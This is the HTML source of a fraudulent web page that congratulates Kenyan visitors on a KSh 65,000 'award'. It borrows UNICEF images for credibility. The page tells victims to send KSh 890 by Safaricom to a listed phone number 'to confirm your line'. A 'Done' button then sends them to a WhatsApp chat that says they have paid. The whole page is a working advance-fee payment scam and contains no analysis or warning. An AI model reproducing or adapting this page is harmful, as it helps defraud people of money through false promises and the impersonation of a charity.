<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations! </title>
    <style>
        body {
            background-image: url('https://ihma.uz/wp-content/uploads/2023/10/unicef-872.jpg');
            background-size: cover;
            background-position: center;
            font-family: Arial, sans-serif;
            margin: 20px;
        }

        .container {
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            margin: 0 auto;
            text-align: center;
        }

        h1 {
            color: green;
            margin-bottom: 20px;
        }

        img {
            max-width: 100%;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .input-box {
            border: 2px solid green; /* Frame the input box in green */
            border-radius: 5px;
            padding: 10px;
            margin-top: 20px;
            display: inline-block;
        }

        .input-box p {
            color: green;
            font-style: italic;
        }

        .input-box input {
            width: 80%;
            padding: 5px;
            border: none;
            border-radius: 5px;
            margin-right: 10px;
        }

        .input-box button {
            background-color: #007bff;
            color: #fff;
            padding: 5px 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .input-box button:hover {
            background-color: #0056b3;
        }

        /* Remove payment background and icons */
        .payment-background, .payment-icons {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CONGRATULATIONS!YOUR AWARD OF KSH 65,000 IS NOW READY</h1>
        <img src="https://www.unicef.org/kenya/sites/unicef.org.kenya/files/styles/press_release_feature/public/WhatsApp%20Image%202020-11-19%20at%2010.26.26.jpeg.webp?itok=VbBZUeYS" alt="Award Image">
        <div class="input-box">
            <p>Follow thiS process To activate your Award.
                1. Copy the number below and pay Ksh 890 using
                your Safaricom line. This is just to confirm your line.
                2. After making the payment, click the button "Done" below.</p>
            <input type="text" id="payTo" value="0759139443" readonly>
            <button onclick="copyToClipboard()">Copy</button>
            <button onclick="navigateToWhatsApp()">Done</button>
        </div>
    </div>

    <script>
        function copyToClipboard() {
            var copyText = document.getElementById("payTo");
            copyText.select();
            copyText.setSelectionRange(0, 99999); /* For mobile devices */

            document.execCommand("copy");
            alert("Copied the text: " + copyText.value);
        }

        function navigateToWhatsApp() {
            var message = encodeURIComponent("I HAVE PAID USING SAFARICOM LINE");
            var whatsappLink = `https://wa.me/2547106163844/?text=${message}`;
            window.location.href = whatsappLink;
        }
    </script>
</body>
</html>
